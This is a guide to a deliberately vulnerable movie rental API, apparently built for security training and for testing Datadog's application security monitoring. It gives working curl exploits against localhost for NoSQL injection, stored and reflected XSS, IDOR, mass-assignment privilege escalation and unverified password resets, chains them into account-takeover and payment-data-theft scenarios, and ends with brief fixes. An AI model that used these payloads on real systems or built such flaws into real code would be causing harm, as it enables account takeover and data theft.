# Insecure Rental - API Vulnerability Guide

⚠️ **All vulnerabilities are integrated into the main API endpoints - no separate `/api/vulnerable` routes needed!**

## Quick Reference

| Endpoint | Vulnerabilities | OWASP Category |
|----------|----------------|----------------|
| `POST /api/auth/login` | NoSQL Injection, Auth Bypass | A03, A07 |
| `POST /api/auth/register` | No Password Validation, Info Disclosure | A07 |
| `GET /api/auth/search` | NoSQL Injection, No Auth | A01, A03 |
| `POST /api/auth/reset-password` | No Verification | A07 |
| `PUT /api/auth/profile` | Mass Assignment, Privilege Escalation | A01, A04 |
| `GET /api/auth/user/:userId` | IDOR, Password Hash Exposure | A01, A02 |
| `GET /api/movies` | NoSQL Injection | A03 |
| `GET /api/movies/:id` | XSS (format=html) | A03 |
| `PUT /api/movies/:id` | No Auth, Mass Assignment | A01 |
| `POST /api/movies/:id/review` | Stored XSS | A03 |
| `GET /api/movies/:id/reviews` | XSS in HTML format | A03 |
| `GET /api/movies/search/advanced` | JavaScript Injection via $where | A03 |
| `GET /api/rentals/:rentalId` | IDOR, Sensitive Data Exposure | A01, A02 |
| `PUT /api/rentals/:rentalId` | IDOR, Mass Assignment | A01, A04 |
| `DELETE /api/rentals/:rentalId` | No Auth | A01 |
| `GET /api/rentals/user` | NoSQL Injection, IDOR | A01, A03 |
| `GET /api/rentals/search/query` | NoSQL Injection | A03 |

---

## Authentication API Vulnerabilities

### 1. NoSQL Injection in Login
**Endpoint**: `POST /api/auth/login`

**Vulnerability**: Password verification can be bypassed using NoSQL operators.

**Exploit**:
```bash
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@example.com", "password": {"$ne": null}}'
```

**Impact**: Complete authentication bypass, account takeover

---

### 2. No Password Validation
**Endpoint**: `POST /api/auth/register`

**Vulnerability**: Accepts any password - empty, weak, etc.

**Exploit**:
```bash
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "test", "email": "test@test.com", "password": ""}'
```

**Impact**: Weak account security, easy brute force

---

### 3. User Enumeration via Search
**Endpoint**: `GET /api/auth/search`

**Vulnerability**: No authentication required, NoSQL injection possible.

**Exploit**:
```bash
# Get all users
curl 'http://localhost:5000/api/auth/search?username[$ne]=null'

# Find admin users
curl 'http://localhost:5000/api/auth/search?username[$regex]=^admin'
```

**Impact**: User enumeration, information disclosure

---

### 4. Password Reset Without Verification
**Endpoint**: `POST /api/auth/reset-password`

**Vulnerability**: No email verification, no token, no old password check.

**Exploit**:
```bash
curl -X POST http://localhost:5000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@example.com", "newPassword": "hacked123"}'
```

**Impact**: Account takeover

---

### 5. Mass Assignment - Privilege Escalation
**Endpoint**: `PUT /api/auth/profile`

**Vulnerability**: Can update ANY field including role.

**Exploit**:
```bash
curl -X PUT http://localhost:5000/api/auth/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [your-token]" \
  -d '{"role": "admin"}'
```

**Impact**: Privilege escalation to admin

---

### 6. IDOR + Password Hash Exposure
**Endpoint**: `GET /api/auth/user/:userId`

**Vulnerability**: No auth required, exposes password hashes.

**Exploit**:
```bash
# Access any user's data including password hash
curl http://localhost:5000/api/auth/user/[any-user-id]
```

**Impact**: Exposed password hashes, complete profile access

---

## Movies API Vulnerabilities

### 7. NoSQL Injection in Movie Search
**Endpoint**: `GET /api/movies`

**Vulnerability**: Multiple query parameters vulnerable to NoSQL injection.

**Exploit**:
```bash
# Get all movies regardless of type
curl 'http://localhost:5000/api/movies?type[$ne]=null'

# Price manipulation
curl 'http://localhost:5000/api/movies?price[$lt]=1'

# Title injection
curl 'http://localhost:5000/api/movies?title[$regex]=.*'
```

**Impact**: Data extraction, query manipulation

---

### 8. Reflected XSS
**Endpoint**: `GET /api/movies/:id?format=html`

**Vulnerability**: Returns HTML with unsanitized movie data.

**Exploit**:
```bash
# First, create a movie with XSS payload
curl -X POST http://localhost:5000/api/movies \
  -H "Content-Type: application/json" \
  -d '{"itemType":"movies","title":"<script>alert(\"XSS\")</script>","description":"Test","genre":"Action","releaseYear":2024,"director":"Test","duration":120,"rating":5,"pricing":{"rent":3.99}}'

# Then access it with format=html
curl "http://localhost:5000/api/movies/[movie-id]?format=html"
```

**Impact**: XSS, session hijacking

---

### 9. Update Without Authentication
**Endpoint**: `PUT /api/movies/:id`

**Vulnerability**: Anyone can update any movie field.

**Exploit**:
```bash
curl -X PUT http://localhost:5000/api/movies/[movie-id] \
  -H "Content-Type: application/json" \
  -d '{"pricing": {"rent": 0.01}}'
```

**Impact**: Data manipulation, business logic bypass

---

### 10. JavaScript Injection via $where
**Endpoint**: `GET /api/movies/search/advanced`

**Vulnerability**: Executes arbitrary JavaScript on database.

**Exploit**:
```bash
curl 'http://localhost:5000/api/movies/search/advanced?condition=this.pricing.rent%20%3C%201000%20||%20true'
```

**Impact**: Remote code execution on database

---

### 11. Stored XSS via Reviews
**Endpoint**: `POST /api/movies/:id/review`

**Vulnerability**: Stores unsanitized comments.

**Exploit**:
```bash
curl -X POST http://localhost:5000/api/movies/[movie-id]/review \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [token]" \
  -d '{"rating": 5, "comment": "<img src=x onerror=alert(document.cookie)>"}'
```

**Impact**: Persistent XSS affecting all users

---

### 12. XSS in Reviews HTML Format
**Endpoint**: `GET /api/movies/:id/reviews?format=html`

**Vulnerability**: Returns HTML with unsanitized review comments.

**Exploit**:
```bash
# After adding malicious review, view in HTML format
curl "http://localhost:5000/api/movies/[movie-id]/reviews?format=html"
```

**Impact**: XSS execution when viewed

---

## Rentals API Vulnerabilities

### 13. IDOR - View Any Rental
**Endpoint**: `GET /api/rentals/:rentalId`

**Vulnerability**: No authentication or authorization.

**Exploit**:
```bash
# Access anyone's rental including full payment details
curl http://localhost:5000/api/rentals/[any-rental-id]
```

**Impact**: Exposed credit cards, CVV, addresses

---

### 14. IDOR - Modify Any Rental
**Endpoint**: `PUT /api/rentals/:rentalId`

**Vulnerability**: No auth, mass assignment.

**Exploit**:
```bash
# Change rental price to $0.01
curl -X PUT http://localhost:5000/api/rentals/[rental-id] \
  -H "Content-Type: application/json" \
  -d '{"price": 0.01, "returned": true}'
```

**Impact**: Business logic bypass, financial fraud

---

### 15. Delete Without Authorization
**Endpoint**: `DELETE /api/rentals/:rentalId`

**Vulnerability**: Anyone can delete any rental.

**Exploit**:
```bash
curl -X DELETE http://localhost:5000/api/rentals/[rental-id]
```

**Impact**: Data loss, denial of service

---

### 16. NoSQL Injection in Rental Search
**Endpoint**: `GET /api/rentals/user`

**Vulnerability**: Query all rentals with payment data.

**Exploit**:
```bash
# Get all rentals with payment info
curl 'http://localhost:5000/api/rentals/user?userId[$ne]=null'
```

**Impact**: Mass data breach, payment info exposure

---

### 17. Query-Based NoSQL Injection
**Endpoint**: `GET /api/rentals/search/query`

**Vulnerability**: Direct query parameter use.

**Exploit**:
```bash
# Get all rentals over certain price
curl 'http://localhost:5000/api/rentals/search/query?price[$gt]=100'

# Get all unreturned rentals
curl 'http://localhost:5000/api/rentals/search/query?returned[$ne]=true'
```

**Impact**: Data extraction

---

## Multi-Step Attack Scenarios

### Scenario 1: Complete Account Takeover
```bash
# 1. Enumerate users
curl 'http://localhost:5000/api/auth/search?username[$regex]=^'

# 2. Get user ID and password hash
curl 'http://localhost:5000/api/auth/user/[user-id]'

# 3. Reset their password
curl -X POST http://localhost:5000/api/auth/reset-password \
  -d '{"email": "victim@example.com", "newPassword": "owned"}'

# 4. Login as victim
curl -X POST http://localhost:5000/api/auth/login \
  -d '{"email": "victim@example.com", "password": "owned"}'
```

### Scenario 2: Privilege Escalation to Admin
```bash
# 1. Register with weak password
curl -X POST http://localhost:5000/api/auth/register \
  -d '{"username": "attacker", "email": "hack@test.com", "password": "x"}'

# 2. Escalate to admin via mass assignment
curl -X PUT http://localhost:5000/api/auth/profile \
  -H "Authorization: Bearer [token]" \
  -d '{"role": "admin"}'

# 3. Access all rentals
curl -H "Authorization: Bearer [token]" \
  http://localhost:5000/api/rentals/all
```

### Scenario 3: Mass Payment Data Extraction
```bash
# Get all rentals with full payment details
curl 'http://localhost:5000/api/rentals/user?userId[$ne]=null'

# Or search for high-value rentals
curl 'http://localhost:5000/api/rentals/search/query?price[$gt]=100'
```

### Scenario 4: Business Logic Bypass
```bash
# 1. Create rental normally
# 2. Modify rental to set price to $0.01 and mark as returned
curl -X PUT http://localhost:5000/api/rentals/[rental-id] \
  -d '{"price": 0.01, "returned": true}'

# 3. Or update movie price to $0
curl -X PUT http://localhost:5000/api/movies/[movie-id] \
  -d '{"pricing": {"rent": 0}}'
```

---

## Testing with Datadog ASM

1. Enable ASM: `DD_APPSEC_ENABLED=true`
2. Execute exploits above
3. View detected attacks in Datadog Security > Application Security
4. Analyze threat patterns and attack traces

---

## Remediation Guide

For each vulnerability type:
- **NoSQL Injection**: Validate input types, use parameterized queries
- **XSS**: Sanitize input, escape output, use CSP
- **IDOR**: Implement proper authorization checks
- **Mass Assignment**: Whitelist allowed fields
- **Auth Issues**: Require strong passwords, implement 2FA, use verification tokens

---

## Disclaimer

This API is **intentionally vulnerable** for:
- ✅ Security education
- ✅ Testing security tools
- ✅ Security training

**DO NOT**:
- ❌ Deploy to production
- ❌ Expose to public internet
- ❌ Use for real transactions
